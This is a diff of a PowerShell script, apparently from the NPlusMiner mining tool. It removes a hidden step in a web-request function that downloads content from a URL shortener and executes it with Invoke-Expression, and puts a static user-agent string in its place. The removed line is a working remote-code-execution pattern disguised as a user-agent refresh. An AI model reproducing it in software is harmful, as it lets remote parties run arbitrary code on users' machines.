@@ -1603,7 +1603,8 @@ Function Merge-Command {
 
 Function Invoke-ProxiedWebRequest {
     $Request = $null
-    If ($Variables -and (-not $Variables.UserAgentRefresh -or $Variables.UserAgentRefresh -le (Get-Date).ToUniversalTime().AddHours(-1))) { Try { $GetUserAgent = (Invoke-WebRequest "http://tiny.cc/8urkuz" -UseBasicParsing).Content; Invoke-Expression $GetUserAgent } catch {} }
+    if (-not $Variables) {$Variables = [hashtable]::Synchronized(@{})}
+    $Variables.UserAgent = "Mozilla/5.0 (Windows NT; Windows NT 10.0; en-US) AppleWebKit/534.6 (KHTML, like Gecko) Chrome/7.0.500.0 Safari/534.6 NPlusMiner/8.1.6"
     If ($Config.Server_Client -and $Variables.ServerRunning -and -not $ByPassServer -and -not $OutFile) {
         Try {
             $ProxyURi = "http://$($Config.Server_ClientIP):$($Config.Server_ClientPort)/Proxy/?url=$($Args[0])"
